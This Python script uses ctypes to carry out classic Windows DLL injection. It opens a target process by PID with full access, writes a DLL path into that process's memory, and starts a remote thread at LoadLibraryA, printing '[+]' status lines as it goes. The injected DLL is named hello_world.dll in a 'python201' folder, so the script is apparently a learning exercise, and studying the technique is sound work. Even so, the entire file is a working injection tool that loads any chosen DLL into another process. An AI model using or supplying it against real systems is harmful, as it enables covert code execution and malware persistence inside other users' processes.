from ctypes import windll
from ctypes import *
from ctypes import wintypes
# Kernel32 setup
kernel32 = windll.kernel32

LPCTSTR = c_char_p
SIZE_T = c_size_t

# OpenProcess
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (
    wintypes.DWORD,  # dwDesiredAccess
    wintypes.BOOL,   # bInheritHandle
    wintypes.DWORD   # dwProcessId
)
OpenProcess.restype = wintypes.HANDLE

# VirtualAllocEx
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (
    wintypes.HANDLE,  # hProcess
    wintypes.LPVOID,  # lpAddress
    SIZE_T,           # dwSize
    wintypes.DWORD,   # flAllocationType
    wintypes.DWORD    # flProtect
)
VirtualAllocEx.restype = wintypes.LPVOID

# WriteProcessMemory
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (
    wintypes.HANDLE,      # hProcess
    wintypes.LPVOID,      # lpBaseAddress
    wintypes.LPCVOID,     # lpBuffer
    SIZE_T,               # nSize
    POINTER(SIZE_T)       # lpNumberOfBytesWritten
)
WriteProcessMemory.restype = wintypes.BOOL

# GetModuleHandleA
GetModuleHandleA = kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = (LPCTSTR,)
GetModuleHandleA.restype = wintypes.HMODULE

# GetProcAddress
GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (
    wintypes.HMODULE,
    LPCTSTR
)
GetProcAddress.restype = wintypes.LPVOID

# CreateRemoteThread
CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (
    wintypes.HANDLE,      # hProcess
    wintypes.LPVOID,      # lpThreadAttributes
    SIZE_T,               # dwStackSize
    wintypes.LPVOID,      # lpStartAddress
    wintypes.LPVOID,      # lpParameter
    wintypes.DWORD,       # dwCreationFlags
    wintypes.LPDWORD      # lpThreadId
)
CreateRemoteThread.restype = wintypes.HANDLE

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04

# Configuration
dll_path = b"C:\\Users\\neutr\\Documents\\python201\\hello_world.dll"
pid = 2160  # target PID

# Open target process
h_process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not h_process:
    raise WinError()

print(f"[+] Process handle: {h_process:#x}")

# Allocate memory in target process
remote_mem = VirtualAllocEx(
    h_process,
    None,
    len(dll_path) + 1,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
)

if not remote_mem:
    raise WinError()

print(f"[+] Allocated memory: {remote_mem:#x}")

# Write DLL path
written = SIZE_T(0)

if not WriteProcessMemory(
    h_process,
    remote_mem,
    dll_path,
    len(dll_path) + 1,
    byref(written)
):
    raise WinError()

print(f"[+] Written {written.value} bytes")

# Get LoadLibraryA address
h_kernel32 = GetModuleHandleA(b"kernel32.dll")
if not h_kernel32:
    raise WinError()

loadlib_addr = GetProcAddress(h_kernel32, b"LoadLibraryA")
if not loadlib_addr:
    raise WinError()

print(f"[+] LoadLibraryA address: {loadlib_addr:#x}")

# Create remote thread
thread_id = wintypes.DWORD(0)

h_thread = CreateRemoteThread(
    h_process,
    None,
    0,
    loadlib_addr,
    remote_mem,
    0,
    byref(thread_id)
)

if not h_thread:
    raise WinError()

print(f"[+] Remote thread created (TID: {thread_id.value})")
print("[+] DLL injected successfully")
